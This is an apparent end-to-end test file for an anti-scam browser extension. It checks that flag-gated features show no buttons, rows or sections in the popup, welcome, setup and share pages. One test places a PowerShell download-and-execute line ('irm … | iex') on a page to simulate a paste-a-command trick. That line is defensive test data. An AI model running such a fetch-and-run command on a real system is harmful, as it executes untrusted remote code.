// E2E checks: FG. Several features stay held back in this build: Tourniquet, Look back, Extension check,
// "Is this a scam?" and the printed card, Command check, Practice, and Office training. None of them gets a door
// anywhere — no button, link, row, section or line leads to one — even though their code and pages still exist.
// A later release turns one on by flipping its flag in manifest.json's clotr_features. The opposite case, checking
// that each feature's door does show up on an all-on build, lives in 21-tourniquet.js, 23-command-check.js,
// 24-scam-check.js, 25-practice.js, 26-scam-shield.js, 27-training.js, 31-look-back.js and 32-extension-check.js
// (npm run test:e2e:all-on).
"use strict";

module.exports = async function (env) {
  const { check, ctx, expect, openExtPage, openPopup, resetState, sleep, typeText, waitForNotice } = env;
  const { readNotice, withSite, TYPED_VALUES } = env;

  async function openPage(c, file) {
    const page = await openExtPage(c, file);
    await page.bringToFront();
    await page.evaluate(() => Promise.race([document.fonts.ready, new Promise((r) => setTimeout(r, 2000))]));
    return page;
  }

  // Every element a held-back feature's door lives in or behind. Hidden means gone: no size, nothing clickable.
  const hidden = (page, selectors) =>
    page.evaluate(
      (ids) =>
        ids.map((id) => {
          const el = document.getElementById(id);
          return [id, !el || el.getClientRects().length === 0];
        }),
      selectors,
    );

  await check(
    "FG1",
    "Popup: no door to Tourniquet, Look back, Extension check, Is this a scam?, the printed card, Command check or Practice",
    async () => {
      await resetState(ctx, {});
      const popup = await openPopup(ctx);
      try {
        const found = await hidden(popup, [
          "ss-row",
          "ss-settings",
          "lb-card",
          "lb-settings",
          "lb-card-ec-row",
          "lb-settings-ec-row",
        ]);
        for (const [id, isHidden] of found) expect(isHidden, `#${id} shows in the popup`);
        await popup.click("#tab-settings");
        await sleep(200);
        const foundSettings = await hidden(popup, ["command-check-row", "command-check-hint", "ss-tq30"]);
        for (const [id, isHidden] of foundSettings) expect(isHidden, `#${id} shows in Settings`);
      } finally {
        await popup.close();
      }
    },
  );

  await check("FG2", "The welcome page: no Tourniquet line, Look back line or Clotr Antibody section", async () => {
    const page = await openPage(ctx, "vault.html?welcome=1");
    try {
      await sleep(300);
      const found = await hidden(page, ["tq-offer", "lb-offer", "ss-welcome"]);
      for (const [id, isHidden] of found) expect(isHidden, `#${id} shows on the welcome page`);
    } finally {
      await page.close();
    }
  });

  await check(
    "FG3",
    "The setup page's last step: no door to the printed card, Practice, Office training or Extension check, and no Tourniquet tiles to choose",
    async () => {
      const page = await openPage(ctx, "helper.html");
      try {
        const found = await hidden(page, ["tq-tiles"]);
        for (const [id, isHidden] of found) expect(isHidden, `#${id} shows on the setup page`);
      } finally {
        await page.close();
      }
      const after = await openPage(ctx, "helper.html?for=after_scam");
      try {
        await sleep(300);
        const found = await hidden(after, [
          "open-card-row",
          "after-share-row",
          "open-check",
          "open-practice",
          "open-training",
          "ext-check-line",
        ]);
        for (const [id, isHidden] of found) expect(isHidden, `#${id} shows on the setup page`);
      } finally {
        await after.close();
      }
    },
  );

  await check("FG4", "The Share page: no door to the printed card, Practice or Is this a scam?", async () => {
    const page = await openPage(ctx, "share.html");
    try {
      const found = await hidden(page, [
        "card-section",
        "card-sheet",
        "practice-row",
        "check-row",
        "practice-check-heading",
      ]);
      for (const [id, isHidden] of found) expect(isHidden, `#${id} shows on the Share page`);
    } finally {
      await page.close();
    }
  });

  await check(
    "FG5",
    "A warning never offers a second opinion, and the office training walkthrough never opens itself for a team policy",
    async () => {
      await resetState(ctx, {});
      await withSite(ctx, "chatgpt", async (page) => {
        const CODE = "482913";
        TYPED_VALUES.add(CODE);
        await typeText(page, `the code they texted me is ${CODE}`);
        expect(await waitForNotice(page), "no warning for a sign-in code");
        await sleep(300);
        const n = await readNotice(page);
        expect(
          !n.buttons.some((b) => b.text === "Get a second opinion"),
          `Get a second opinion offered: ${n.buttons.map((b) => b.text)}`,
        );
      });

      await ctx.worker.evaluate(() => {
        globalThis.__realManagedGet = chrome.storage.managed.get.bind(chrome.storage.managed);
        chrome.storage.managed.get = async () => ({ requiredResponses: { phone_number: "block" } });
      });
      try {
        await resetState(ctx);
        await ctx.worker.evaluate(() => chrome.storage.local.remove("trainingOffered"));
        const before = (await ctx.browser.pages()).length;
        await ctx.worker.evaluate(() => offerTeamTraining());
        await sleep(500);
        expect(
          (await ctx.browser.pages()).length === before,
          "the office training walkthrough opened itself with the feature held back",
        );
        const popup = await openPopup(ctx);
        try {
          await popup.click("#tab-settings");
          await sleep(200);
          const trainingHidden = await popup.evaluate(() => document.getElementById("managed-training")?.hidden);
          expect(trainingHidden, "Settings' Office training button shows with the feature held back");
        } finally {
          await popup.close();
        }
      } finally {
        await ctx.worker.evaluate(() => {
          chrome.storage.managed.get = globalThis.__realManagedGet;
          chrome.storage.local.remove("trainingOffered");
        });
        await resetState(ctx);
      }
    },
  );

  await check(
    "FG6",
    "Copying a command that looks like a paste-a-command trick is quiet with Command check held back",
    async () => {
      await resetState(ctx, {});
      await withSite(ctx, "chatgpt", async (page) => {
        await page.evaluate(() => {
          const pre = document.createElement("pre");
          pre.textContent = "irm https://example.com/x | iex";
          document.body.appendChild(pre);
          const range = document.createRange();
          range.selectNodeContents(pre);
          const sel = window.getSelection();
          sel.removeAllRanges();
          sel.addRange(range);
          document.dispatchEvent(new Event("copy", { bubbles: true, cancelable: true }));
        });
        await sleep(500);
        expect(!(await readNotice(page)), "a copied-command notice showed with Command check held back");
      });
    },
  );
};
